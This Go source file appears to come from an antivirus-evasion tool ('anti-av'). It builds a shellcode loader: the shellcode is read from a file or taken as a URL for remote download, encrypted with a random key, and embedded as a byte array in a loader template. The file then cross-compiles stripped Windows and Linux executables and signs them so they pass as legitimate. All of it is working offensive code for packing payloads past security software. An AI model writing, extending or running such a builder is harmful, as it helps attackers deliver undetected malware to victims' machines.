package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/b1gcat/anti-av/utils"
	"github.com/sirupsen/logrus"
)

var (
	buildDir = filepath.Join("dist", "_tmp")
	copyCmd  = "cp"
)

func init() {
	if runtime.GOOS == "windows" {
		copyCmd = "copy"
	}
	rand.Seed(time.Now().UnixNano())
}

func (c *config) build() {
	c.buildPayload()
	code, err := c.genCode()
	if err != nil {
		logrus.Error(err.Error())
		return
	}
	logrus.Info("[*] generated Code Done.")
	if err := c.buildCode(code); err != nil {
		logrus.Error(err.Error())
		return
	}
	logrus.Info("[*] build Done")
}

func (c *config) buildCode(key []byte) error {
	os.RemoveAll(buildDir)
	os.Mkdir(buildDir, 0755)

	if err := c.cmd(fmt.Sprintf("%s loader/%s/* %s/", copyCmd, c.loader, buildDir)); err != nil {
		return err
	}

	os.Chdir(buildDir)
	sc, err := ioutil.ReadFile("sc.go")
	if err != nil {
		return err
	}
	code := bytes.ReplaceAll(sc, []byte("{{CODE}}"), key)
	if err := ioutil.WriteFile("sc.go", code, 0755); err != nil {
		return err
	}
	switch c.os {
	case "windows":
		ldflag := "-w -s"
		utils.CreateIcoPropertity("386")
		cmd := fmt.Sprintf(`CGO_ENABLED=1 CC=i686-w64-mingw32-gcc GOOS=windows GOARCH="386" go build -ldflags "%s" -trimpath -o "../antiav_windows_386.exe"`, ldflag)
		if err := c.cmd(cmd); err != nil {
			return err
		}
		os.Remove("resource_windows.syso")
		utils.SignExecutable(c.sign, "../antiav_windows_386.exe")

		utils.CreateIcoPropertity("amd64")
		cmd = fmt.Sprintf(`CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH="amd64" go build -ldflags "%s" -trimpath -o "../antiav_windows_amd64.exe"`, ldflag)
		if err := c.cmd(cmd); err != nil {
			return err
		}
		os.Remove("resource_windows.syso")
		utils.SignExecutable(c.sign, "../antiav_windows_amd64.exe")
	case "linux":
		cmd := `CGO_ENABLED=1 GOOS=linux GOARCH="amd64" go build -ldflags "-w -s" -trimpath -o "../antiav_linux_amd64"`
		if err := c.cmd(cmd); err != nil {
			return err
		}
		utils.SignExecutable(c.sign, "../antiav_linux_amd64")
	}

	return nil
}

func (c *config) genCode() ([]byte, error) {
	var sc []byte
	var err error

	key := make([]byte, 8)
	if strings.HasPrefix(c.shellcode, "http") {
		sc = []byte(c.shellcode)
		//下载shellcode标记
		rand.Read(key[4:])
	} else {
		sc, err = ioutil.ReadFile(c.shellcode)
		if err != nil {
			return nil, err
		}
		rand.Read(key)
	}

	esc, err := c.payloadEncrypt(key, sc, false)
	if err != nil {
		return nil, err
	}

	codeBuf := make([]string, 0)
	for _, v := range esc {
		codeBuf = append(codeBuf, fmt.Sprintf("0x%02x", v))
	}

	return []byte(strings.Join(codeBuf, ",")), nil
}

func (c *config) cmd(cmd string) error {
	var sh *exec.Cmd
	if runtime.GOOS == "windows" {
		sh = exec.Command("cmd", "/C", cmd)
	} else {
		sh = exec.Command("sh", "-c", cmd)
	}
	sh.Stdin = os.Stdin
	sh.Stdout = os.Stdout
	sh.Stderr = os.Stderr
	if err := sh.Run(); err != nil {
		return err
	}
	return nil
}
